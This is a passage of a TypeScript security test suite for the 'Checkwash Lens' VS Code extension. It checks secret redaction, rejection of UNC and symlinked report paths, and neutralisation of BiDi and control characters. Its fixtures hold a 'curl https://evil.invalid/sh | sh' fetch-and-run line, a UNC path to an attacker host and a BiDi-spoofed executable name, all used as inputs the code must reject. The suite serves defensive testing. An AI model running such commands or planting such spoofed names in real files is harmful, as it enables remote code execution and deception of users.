  const diet = buildContextDietDiff({
    repositoryRoot: REPO_ROOT,
    effectiveBaseOid: baseOid,
    effectiveHeadOid: headOid,
    rawUnifiedDiff: rawDiff,
    changedFiles: [
      { status: "A", oldPath: null, newPath: "my dir/.env.production" },
      { status: "D", oldPath: ".env", newPath: ".env" },
      { status: "M", oldPath: "config/service.yaml", newPath: "config/service.yaml" },
    ],
  });

  assert.strictEqual(diet.hasSensitiveData, true);
  assert.strictEqual(
    diet.keptFilePaths.includes("my dir/.env.production"),
    true,
    `Expected unquoted 'my dir/.env.production' in keptFilePaths, got ${JSON.stringify(diet.keptFilePaths)}`
  );
  assert.strictEqual(
    diet.keptFilePaths.includes(".env"),
    true,
    "Deleted .env must resolve to '.env', not 'unknown'"
  );
  assert.strictEqual(
    diet.sensitiveFindings.some(
      (f) => f.path === "my dir/.env.production" && f.kind === "sensitive_filename"
    ),
    true
  );
  assert.strictEqual(
    diet.sensitiveFindings.some((f) => f.path === ".env" && f.kind === "sensitive_filename"),
    true
  );

  // Verify every single secret is scrubbed from redactedFormattedPayload!
  for (const rawSecret of [secretEnvPw, secretStripe, secretAnthropic, secretYaml, secretJwt]) {
    assert.strictEqual(
      diet.redactedFormattedPayload.includes(rawSecret),
      false,
      `Redacted payload leaked secret: ${rawSecret.slice(0, 10)}...`
    );
  }

  const unconfirmedUnredacted = authorizeClipboardCopy({
    dietResult: diet,
    mode: "unredacted",
    userConfirmedUnredactedCopy: false,
  });
  assert.strictEqual(unconfirmedUnredacted.ok, false);

  return {
    keptFilePaths: diet.keptFilePaths,
    sensitiveFindingCount: diet.sensitiveFindings.length,
    allSecretsScrubbed: true,
  };
}

// ============================================================================
// RT-07: Offline Report `O_NOFOLLOW` FD Safety & Repo-Switch State Isolation
// ============================================================================

async function testRt07OfflineReportFdSafetyAndRepoSwitchClear(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const repoA = initTwoCommitRepo(tempRoot, "rt07-repo-a").repoDir;
  const repoB = initTwoCommitRepo(tempRoot, "rt07-repo-b").repoDir;

  const validCheckwashReport = path.join(tempRoot, "rt07-valid-checkwash.json");
  fs.copyFileSync(
    path.join(REPO_ROOT, "fixtures", "phase0", "a01-block.findings.json"),
    validCheckwashReport
  );

  const controller = new CheckwashLensController();
  let symlinkRejected = false;
  try {
    controller.selectRepository(repoA);
    const loadRes = controller.viewOfflineReportFileReadOnly(validCheckwashReport);
    assert.strictEqual(loadRes.ok, true);
    assert.notStrictEqual(controller.getViewSnapshot().offlineFindingsPreview, null);

    // Switching repository MUST clear offlineFindingsPreview so stale findings never bleed across repos!
    controller.selectRepository(repoB);
    assert.strictEqual(
      controller.getViewSnapshot().offlineFindingsPreview,
      null,
      "Switching repository must clear offlineFindingsPreview"
    );

    // Reload and verify explicit clearOfflineReadOnlyPreview()
    assert.strictEqual(controller.viewOfflineReportFileReadOnly(validCheckwashReport).ok, true);
    const clearedSnap = controller.clearOfflineReadOnlyPreview();
    assert.strictEqual(clearedSnap.offlineFindingsPreview, null);

    // Reject UNC path immediately without touching network
    const uncRes = controller.viewOfflineReportFileReadOnly(
      "\\\\evil-attacker.invalid\\share\\report.json"
    );
    assert.strictEqual(uncRes.ok, false);

    // Reject directory passed as report path
    const dirRes = controller.viewOfflineReportFileReadOnly(repoA);
    assert.strictEqual(dirRes.ok, false);

    // Reject symlink report path when symlink creation is supported
    const symReport = path.join(tempRoot, "rt07-symlink-report.json");
    let symCreated = false;
    try {
      fs.symlinkSync(validCheckwashReport, symReport, "file");
      symCreated = true;
    } catch {
      // Unprivileged Windows without Developer Mode
    }
    if (symCreated) {
      const symRes = controller.viewOfflineReportFileReadOnly(symReport);
      assert.strictEqual(symRes.ok, false, "Symlink offline report must be rejected");
      symlinkRejected = true;
    }
  } finally {
    controller.dispose();
  }

  return {
    repoSwitchClearedPreview: true,
    uncReportRejected: true,
    directoryReportRejected: true,
    symlinkRejected,
  };
}

// ============================================================================
// RT-08: Worktree Pre-Check Green `Pass` Immediately Turns `[Stale]` on Dirty Edit
// ============================================================================

async function testRt08WorktreePreCheckGreenPassTurnsStaleOnEdit(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const { repoDir } = initTwoCommitRepo(tempRoot, "rt08-worktree-stale");
  const testFileAbs = path.join(repoDir, "tests", "test_calc.py");
  const committedTestText = fs.readFileSync(testFileAbs, "utf8");

  // Write a valid uncommitted improvement on disk so Worktree Pre-Check evaluates an actual diff -> Pass
  fs.appendFileSync(
    path.join(repoDir, "src", "calc.py"),
    "\ndef sub(a: int, b: int) -> int:\n    return a - b\n",
    "utf8"
  );
  const worktreeCleanText =
    committedTestText + "    assert mul(3, 3) == 9\n";
  fs.writeFileSync(testFileAbs, worktreeCleanText, "utf8");

  const controller = new CheckwashLensController();
  const hostDesc = makeTrustedHostDesc(repoDir);
  try {
    const cleanOpenDoc = {
      repositoryRoot: repoDir,
      relativePath: "tests/test_calc.py",
      isDirty: false,
      verifiedVersion: 1,
      currentVersionAtPublish: 1,
      text: worktreeCleanText,
      isClosedOrDeleted: false,
    };

    const passSnap = await controller.scanUncommittedSnapshot(hostDesc, "worktree", [cleanOpenDoc]);
    assert.strictEqual(passSnap.evaluatedState.state, "Pass");
    assert.strictEqual(passSnap.evaluatedState.lifecycle.stale, false);
    assert.strictEqual(passSnap.statusBar.text, "$(check) Checkwash [Worktree Pre-Check]: Pass");
    assert.strictEqual(passSnap.statusBar.colorTheme, "default");

    // User weakens test in unsaved editor buffer WITHOUT re-running Pre-Check
    controller.onOpenDocumentsChanged([
      {
        repositoryRoot: repoDir,
        relativePath: "tests/test_calc.py",
        isDirty: true,
        verifiedVersion: 1,
        currentVersionAtPublish: 2,
        text: "def test_add() -> None:\n    assert True\n",
        isClosedOrDeleted: false,
      },
    ]);
    const staleSnap = controller.getViewSnapshot();
    assert.strictEqual(
      staleSnap.evaluatedState.lifecycle.stale,
      true,
      "Worktree Pre-Check Pass must immediately turn stale when dirty buffer diverges"
    );
    assert.strictEqual(
      staleSnap.statusBar.text,
      "$(warning) Checkwash [Worktree Pre-Check]: Pass (Stale)"
    );
    assert.strictEqual(staleSnap.statusBar.colorTheme, "warning");
    assert.strictEqual(staleSnap.treeNodes[0].iconId, "warning");

    // User reverts buffer back to exact baseline -> stale clears cleanly!
    controller.onOpenDocumentsChanged([
      {
        repositoryRoot: repoDir,
        relativePath: "tests/test_calc.py",
        isDirty: false,
        verifiedVersion: 1,
        currentVersionAtPublish: 3,
        text: worktreeCleanText,
        isClosedOrDeleted: false,
      },
    ]);
    const restoredSnap = controller.getViewSnapshot();
    assert.strictEqual(restoredSnap.evaluatedState.lifecycle.stale, false);
    assert.strictEqual(restoredSnap.statusBar.text, "$(check) Checkwash [Worktree Pre-Check]: Pass");

    // Verify committed-range Pass verdict remains immutable on dirty worktree edit (Rev 3 contract)
    runGit(repoDir, ["checkout", "--", "."]);
    const committedDoc = {
      ...cleanOpenDoc,
      text: committedTestText,
    };
    const committedPass = await controller.scanCommittedRange(hostDesc, "HEAD~1..HEAD", [committedDoc]);
    assert.strictEqual(committedPass.evaluatedState.state, "Pass");
    controller.onOpenDocumentsChanged([
      {
        repositoryRoot: repoDir,
        relativePath: "tests/test_calc.py",
        isDirty: true,
        verifiedVersion: 1,
        currentVersionAtPublish: 4,
        text: "def test_add() -> None:\n    assert True\n",
        isClosedOrDeleted: false,
      },
    ]);
    assert.strictEqual(controller.getViewSnapshot().evaluatedState.lifecycle.stale, false);
  } finally {
    controller.dispose();
  }

  return {
    worktreePassTurnedStaleOnEdit: true,
    worktreePassRestoredOnRevert: true,
    committedVerdictRemainedImmutable: true,
  };
}

// ============================================================================
// RT-09: Unicode BiDi / Control Neutralization & `[Imported Read-Only]` Badge
// ============================================================================

async function testRt09UnicodeBidiSanitizationAndImportedProveBadge(
  tempRoot: string
): Promise<Record<string, unknown>> {
  const bidiPayload = "safe_\u202Egpj.exe\u202C_\u2066hidden\u2069_\x1b[31mred";
  const sanitized = sanitizeUntrustedDisplayString(bidiPayload);
  const rawBidiOrEscRe = /[\u202A-\u202E\u2066-\u2069\u061C\u200E\u200F\x1b]/;
  assert.strictEqual(rawBidiOrEscRe.test(sanitized), false);
  assert.strictEqual(sanitized.includes("\\u202E"), true);
  assert.strictEqual(sanitized.includes("\\u2066"), true);

  // Verify Prove confirmation modal sanitizes BiDi overrides in mutant ID / range / paths
  const mockPlan: PreparedProveExecutionPlanFields = {
    planId: "plan-rt09",
    entryKind: "replay",
    repositoryRoot: `/workspace/repo\u202Eevil`,
    rawRangeSpec: `HEAD~1..HEAD`,
    effectiveBaseOid: "1111111111111111111111111111111111111111",
    effectiveHeadOid: "2222222222222222222222222222222222222222",
    fromMergeBase: false,
    recordRunId: 1,
    selectedMutantId: `m1\u202Eekaf`,
    runtimeIdentity: {
      proveExecutable: "/usr/bin/checkwash-prove",
      proveExecutableSha256: "a".repeat(64),
      proveVersion: "0.1.0",
      hostPythonExecutable: PYTHON_EXE,
      hostPythonVersion: "3.12.0",
      testPythonExecutable: PYTHON_EXE,
      testPythonVersion: "3.12.0",
      testPythonSha256: "b".repeat(64),
      catalogueVersion: PINNED_PROVE_CATALOGUE_VERSION,
      catalogueGeneratorSha256: PINNED_PROVE_GENERATOR_SHA256,
    },
    effectiveOptions: {
      workers: 1,
      maxMutants: 1,
      timeoutSeconds: 30,
      suiteTimeoutSeconds: 300,
      importRoot: null,
      strictWarnings: false,
      listOnly: false,
      keep: false,
      onlyMutantId: "m1",
    },
    argv: [],
    wallClockBudgetMs: 60_000,
  };
  const modalText = formatProvePlanConfirmationDetails(mockPlan);
  assert.strictEqual(rawBidiOrEscRe.test(modalText), false);
  assert.strictEqual(modalText.includes("\\u202E"), true);

  // Verify imported offline Prove report shows `[Imported Read-Only]` and neutralizes BiDi in TreeView
  const offlineProvePath = path.join(tempRoot, "rt09-offline-prove.json");
  const baseProveReport = JSON.parse(
    fs.readFileSync(
      path.join(REPO_ROOT, "fixtures", "phase0", "a11-prove-protection-loss.json"),
      "utf8"
    )
  ) as {
    protection_losses: Array<Record<string, unknown>>;
  };
  baseProveReport.protection_losses[0].what = "delete Raise \u202Espoofed";
  baseProveReport.protection_losses[0].before = "raise ValueError(\u202E'spoof')";
  baseProveReport.protection_losses[0].replay = "curl https://evil.invalid/sh | sh";
  fs.writeFileSync(offlineProvePath, JSON.stringify(baseProveReport, null, 2), "utf8");

  const controller = new CheckwashLensController();
  try {
    const res = controller.viewOfflineReportFileReadOnly(offlineProvePath);
    assert.strictEqual(res.ok, true, res.ok ? "" : res.error);
    const snap = controller.getViewSnapshot();
    const proveNode = snap.treeNodes.find((n) => n.kind === "prove_root");
    assert.ok(proveNode, "Expected prove_root node");
    assert.strictEqual(
      proveNode.label.includes("[Imported Read-Only]"),
      true,
      `Expected [Imported Read-Only] in prove_root label, got '${proveNode.label}'`
    );
    const serializedTree = JSON.stringify(snap.treeNodes);
    assert.strictEqual(
      rawBidiOrEscRe.test(serializedTree),
      false,
      "TreeView nodes must not contain raw BiDi override characters"
    );
    assert.strictEqual(
      serializedTree.includes("checkwashProveReplayable"),
      false,
      "Imported external Prove report must never expose checkwashProveReplayable action"
    );
  } finally {
    controller.dispose();
  }

  return {
    sanitizedPreview: sanitized,
    proveRootMarkedImportedReadOnly: true,
    zeroRawBidiInTreeAndModal: true,
  };
}

// ============================================================================
// RT-10: Native Broker Split `"CAN"+"CEL"`, Atomic `pidFile` & `0.1.0`/`0.6.0` Split
// ============================================================================

async function testRt10NativeBrokerSplitCancelAtomicPidAndVersionSplit(
  tempRoot: string
): Promise<Record<string, unknown>> {
  // 1. Direct Native Broker test: split `"CAN"` + `"CEL\n"` across separate writes + atomic pidFile
  const brokerPath = path.join(REPO_ROOT, "bundled", resolveBundledBrokerFilename());
  const pidFile = path.join(tempRoot, "rt10-child.pid");
  const fullArgv = [PYTHON_EXE, "-I", "-S", "-B", "-c", "import time; time.sleep(30)"];
  const argsB64 = encodeNulSeparatedBase64(fullArgv);
  const envEntries = IS_WIN32
    ? [`SystemRoot=${process.env.SystemRoot ?? "C:\\Windows"}`, "PYTHONUTF8=1"]
    : ["PATH=/usr/local/bin:/usr/bin:/bin", "PYTHONUTF8=1"];
  const envB64 = encodeNulSeparatedBase64(envEntries);
  const reqLine =
    [
      "CWBROKER1",
      "25000",
      "1048576",
      "1048576",
      "0",
      Buffer.from(PYTHON_EXE, "utf8").toString("base64"),
      Buffer.from(tempRoot, "utf8").toString("base64"),
      Buffer.from(pidFile, "utf8").toString("base64"),
      argsB64,
      envB64,
    ].join("\t") + "\n";

  const brokerOut = await new Promise<{
    exitCode: number | null;
    stdout: string;
    stderr: string;
    observedPid: number;
    leftoverTmpFiles: string[];
  }>((resolve, reject) => {
    const child = cp.spawn(brokerPath, [], {
      stdio: ["pipe", "pipe", "pipe"],
      windowsHide: true,
    });
    child.stdin.write(reqLine);

    let out = "";
    let err = "";
    child.stdout.on("data", (d: Buffer) => {
      out += d.toString("utf8");
    });
    child.stderr.on("data", (d: Buffer) => {
      err += d.toString("utf8");
    });
    child.on("error", reject);

    // Poll until atomic pidFile appears, then send split "CAN" ... 60ms ... "CEL\n" WITHOUT closing stdin!
    const startMs = Date.now();
    const pollTimer = setInterval(() => {
      if (fs.existsSync(pidFile)) {
        clearInterval(pollTimer);
        const rawPid = fs.readFileSync(pidFile, "utf8").trim();
        const parsedPid = Number.parseInt(rawPid, 10);
        const leftoverTmp = fs
          .readdirSync(tempRoot)
          .filter((n) => n.startsWith("rt10-child.pid.tmp."));

        // Write chunk 1: "CAN"
        child.stdin.write("CAN");
        setTimeout(() => {
          // Write chunk 2: "CEL\n" (keep stdin open to prove rolling-window CANCEL detection, not EOF!)
          child.stdin.write("CEL\n");
        }, 60);

        child.on("close", (code) => {
          try {
            child.stdin.end();
          } catch {
            // ignore
          }
          resolve({
            exitCode: code,
            stdout: out.trim(),
            stderr: err.trim(),
            observedPid: parsedPid,
            leftoverTmpFiles: leftoverTmp,
          });
        });
      } else if (Date.now() - startMs > 8000) {
        clearInterval(pollTimer);
        child.kill("SIGKILL");
        reject(new Error(`Timed out waiting for broker pidFile: ${err || out}`));
      }
    }, 25);
  });

  assert.strictEqual(brokerOut.exitCode, 0, `Broker exited non-zero: ${brokerOut.stderr}`);
  assert.ok(brokerOut.observedPid > 0, "Expected positive integer PID from atomic pidFile");
  assert.strictEqual(
    brokerOut.leftoverTmpFiles.length,
    0,
    "Atomic pidFile rename must leave zero .tmp.<pid> files"
  );
  const brokerJson = JSON.parse(brokerOut.stdout) as {
    status: string;
    cleanupConfirmed: boolean;
    activeProcessesRemaining: number;
  };
  assert.strictEqual(
    brokerJson.status,
    "cancelled",
    `Expected status 'cancelled' from split CAN+CEL chunks, got '${brokerJson.status}'`
  );
  assert.strictEqual(brokerJson.cleanupConfirmed, true);
  assert.strictEqual(brokerJson.activeProcessesRemaining, 0);

  // 2. Public SemVer vs optional local VERSION-LOCAL.json separation & VSIX exclusion audit
  const pkgJson = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, "package.json"), "utf8")) as {
    name: string;
    version: string;
  };
  assert.match(pkgJson.version, /^\d+\.\d+\.\d+$/, "External package.json version must be valid SemVer");
  const versionLocalPath = path.join(REPO_ROOT, "VERSION-LOCAL.json");
  let localVersion: string | null = null;
  if (fs.existsSync(versionLocalPath)) {
    const versionLocal = JSON.parse(fs.readFileSync(versionLocalPath, "utf8")) as {
      publicVersion: string;
      publicSeries: string;
      localVersion: string;
      localIteration: number;
    };
    assert.strictEqual(versionLocal.publicVersion, pkgJson.version);
    assert.strictEqual(pkgJson.version.startsWith(`${versionLocal.publicSeries}.`), true);
    assert.ok(versionLocal.localVersion.length > 0);
    assert.ok(versionLocal.localIteration >= 6);
    localVersion = versionLocal.localVersion;
  }

  const vscodeIgnoreLines = fs
    .readFileSync(path.join(REPO_ROOT, ".vscodeignore"), "utf8")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && !l.startsWith("#"));
  assert.strictEqual(
    vscodeIgnoreLines[0],
    "*",
    ".vscodeignore must begin with default-deny '*' allowlist rule"
  );
  assert.strictEqual(
    vscodeIgnoreLines.some((l) => l.includes("VERSION-LOCAL.json") && l.startsWith("!")),
    false,
    ".vscodeignore must never allowlist VERSION-LOCAL.json"
  );

  // Build current target VSIX and verify VERSION-LOCAL.json is absent and filename matches package.json version
  const pkgBuild = cp.spawnSync(
    process.execPath,
    [path.join(REPO_ROOT, "scripts", "package_vsix.js"), "--target", ACTIVE_VSIX_TARGET],
    { cwd: REPO_ROOT, encoding: "utf8", windowsHide: true }
  );
  assert.strictEqual(
    pkgBuild.status,
    0,
    `package_vsix.js failed: ${pkgBuild.stderr || pkgBuild.stdout}`
  );
  const vsixName = `${pkgJson.name}-${pkgJson.version}-${ACTIVE_VSIX_TARGET}.vsix`;
  assert.strictEqual(vsixName, `checkwash-lens-${pkgJson.version}-${ACTIVE_VSIX_TARGET}.vsix`);
  const vsixEntries = readZipEntries(fs.readFileSync(path.join(REPO_ROOT, vsixName)));
  assert.strictEqual(
    vsixEntries.some((e) => /VERSION-LOCAL\.json/i.test(e)),
    false,
    "VERSION-LOCAL.json must never be packaged inside distributable .vsix"
  );

  return {
    splitCancelBrokerStatus: brokerJson.status,
    cleanupConfirmed: brokerJson.cleanupConfirmed,
    publicVersion: pkgJson.version,
    localVersion,
    vsixVerified: vsixName,
  };
}

// ============================================================================
// Runner Entry Point
// ============================================================================

async function main(): Promise<void> {
  console.log(`=== Checkwash Lens Red-Team Hardening & Version Split Suite (${ACTIVE_PLATFORM}) ===`);
  const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "cw-v06-redteam-"));
  const cases: RedTeamCaseResult[] = [];

  const suite: Array<{
    id: string;
    name: string;
    fn: () => Promise<Record<string, unknown>>;
  }> = [
    {
      id: "RT-01",
      name: "Git pointer UNC/escape block & Restricted Mode zero .git probe",
      fn: () => testRt01GitPointerAndRestrictedZeroProbe(tempRoot),
    },
    {
      id: "RT-02",
      name: "Repo .git/config hook/fsmonitor neutralization, symlinked index & alternates block",
      fn: () => testRt02GitConfigHooksSymlinkIndexAndAlternates(tempRoot),
    },
    {
      id: "RT-03",
      name: "Controlled empty CWD isolation (0700 UID-scoped + symlink-squat fallback)",
      fn: () => testRt03ControlledEmptyCwdIsolation(tempRoot),
    },
    {
      id: "RT-04",
      name: "Windows .bat/.cmd shim & non-PE executable rejection",
      fn: () => testRt04WindowsBatchShimAndNonPeRejection(tempRoot),
    },
    {
      id: "RT-05",
      name: "Command argument hardening (runEnvironmentDoctor & openImmutableRevision)",
      fn: () => testRt05CommandArgumentHardening(tempRoot),
    },
    {
      id: "RT-06",
      name: "Context Diet C-quoted Git paths, deleted .env & .env/YAML/token redaction",
      fn: () => testRt06ContextDietQuotedPathsAndEnvYamlSecrets(),
    },
    {
      id: "RT-07",
      name: "Offline report O_NOFOLLOW FD safety & repo-switch preview isolation",
      fn: () => testRt07OfflineReportFdSafetyAndRepoSwitchClear(tempRoot),
    },
    {
      id: "RT-08",
      name: "Worktree Pre-Check green Pass immediately turns [Stale] on dirty edit",
      fn: () => testRt08WorktreePreCheckGreenPassTurnsStaleOnEdit(tempRoot),
    },
    {
      id: "RT-09",
      name: "Unicode BiDi / control-char neutralization & [Imported Read-Only] Prove badge",
      fn: () => testRt09UnicodeBidiSanitizationAndImportedProveBadge(tempRoot),
    },
    {
      id: "RT-10",
      name: "Native broker split CAN+CEL pipe cancel, atomic pidFile & 0.1.0/0.6.0 version split",
      fn: () => testRt10NativeBrokerSplitCancelAtomicPidAndVersionSplit(tempRoot),
    },
  ];

  for (const item of suite) {
    const t0 = Date.now();
    try {
      const details = await item.fn();
      const durationMs = Date.now() - t0;
      cases.push({ id: item.id, name: item.name, passed: true, durationMs, details });
      console.log(`  [PASS] ${item.id}: ${item.name} (${durationMs}ms)`);
    } catch (err) {
      const durationMs = Date.now() - t0;
      const msg = err instanceof Error ? err.stack || err.message : String(err);
      cases.push({ id: item.id, name: item.name, passed: false, durationMs, details: {}, error: msg });
      console.error(`  [FAIL] ${item.id}: ${item.name} -> ${msg}`);
    }
  }

  try {
    fs.rmSync(tempRoot, { recursive: true, force: true });
  } catch {
    // Best-effort cleanup
  }

  fs.mkdirSync(EVIDENCE_DIR, { recursive: true });
  const passedCount = cases.filter((c) => c.passed).length;
  const versionLocalPath = path.join(REPO_ROOT, "VERSION-LOCAL.json");
  const versionLocal = fs.existsSync(versionLocalPath)
    ? JSON.parse(fs.readFileSync(versionLocalPath, "utf8"))
    : null;
  const pkgJson = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, "package.json"), "utf8"));

  let sourceSha = "unknown";
  let worktreeClean = false;
  try {
    sourceSha = cp
      .spawnSync(GIT_EXE, ["-C", REPO_ROOT, "rev-parse", "HEAD"], {
        encoding: "utf8",
        windowsHide: true,
      })
      .stdout.trim();
    const statusPorcelain = cp
      .spawnSync(GIT_EXE, ["-C", REPO_ROOT, "status", "--porcelain"], {
        encoding: "utf8",
        windowsHide: true,
      })
      .stdout.trim();
    worktreeClean = statusPorcelain.length === 0;
  } catch {
    // ignore
  }

  const receipt = {
    suite: "v06-redteam-hardening",
    publicVersion: pkgJson.version,
    localVersion: versionLocal?.localVersion ?? null,
    timestampUtc: new Date().toISOString(),
    executionPolicyMarker: process.env.CW_EVIDENCE_TAG?.trim() || "LOCAL_VERIFICATION",
    hostMetadata: getPlatformExecutionMetadata(),
    platform: ACTIVE_PLATFORM,
    arch: process.arch,
    nodeVersion: process.version,
    sourceSha,
    worktreeClean,
    passedCount,
    totalCount: cases.length,
    allPassed: passedCount === cases.length,
    cases,
  };
  fs.writeFileSync(RESULTS_FILE, JSON.stringify(receipt, null, 2) + "\n", "utf8");
  console.log(
    `=== Wrote Red-Team hardening receipt to ${RESULTS_FILE} (${passedCount}/${cases.length} passed) ===`
  );

  if (passedCount !== cases.length) {
    process.exit(1);
  }
}

void main();
